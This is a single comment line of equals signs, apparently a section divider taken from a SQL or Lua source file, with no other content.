-- =============================================================================